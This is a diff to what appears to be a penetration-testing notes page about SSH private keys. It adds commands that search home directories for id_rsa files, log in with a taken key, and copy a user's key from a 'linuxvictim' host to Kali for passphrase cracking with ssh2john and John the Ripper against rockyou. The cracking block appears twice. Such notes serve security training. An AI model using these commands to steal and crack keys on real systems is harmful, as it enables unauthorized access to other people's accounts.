@@ -8,6 +8,40 @@
 /home/user/.ssh/id_rsa
 ```
 
+```
+find /home/ -name "id_rsa"
+```
+
+</details>
+
+<details>
+
+<summary>SSH with Private Key</summary>
+
+```
+ssh -i svuser.key svuser@controller
+```
+
+</details>
+
+<details>
+
+<summary>How to tell if a key is encrypted with passphrase?</summary>
+
+![](<../.gitbook/assets/image (300).png>)
+
+</details>
+
+<details>
+
+<summary>Cracking passphrase of SSH key</summary>
+
+<pre><code><strong>#Copy file over to Kali
+</strong><strong>scp root@linuxvictim:/home/linuxvictim/svuser.key .
+</strong>/usr/share/john/ssh2john.py svuser.key > svuser.hash
+john --wordlist=/usr/share/wordlists/rockyou.txt svuser.hash
+</code></pre>
+
 </details>
 
 <details>
@@ -42,3 +76,11 @@ amrois
 ```
 
 </details>
+
+<pre><code><strong>scp root@linuxvictim:/home/linuxvictim/svuser.key .
+</strong>/usr/share/john/ssh2john.py svuser.key > svuser.hash
+john --wordlist=/usr/share/wordlists/rockyou.txt svuser.hash
+</code></pre>
+
+
+
